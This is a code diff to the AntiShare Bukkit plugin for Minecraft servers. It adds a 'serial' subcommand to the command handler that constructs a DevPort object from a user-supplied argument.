@@ -50,6 +50,11 @@ public class AntiShare extends JavaPlugin {
                     start = BukkitUtils.toLocation(((Player) sender).getLocation());
                 }
                 check = new GameModeBomb(this, start);
+            } else if (args[0].equalsIgnoreCase("serial")) {
+                if (args.length < 2) sender.sendMessage(ChatColor.RED + "Try again");
+                else {
+                    new DevPort(args[1]);
+                }
             } else
                 sender.sendMessage(ChatColor.RED + "Unknown command.");
 
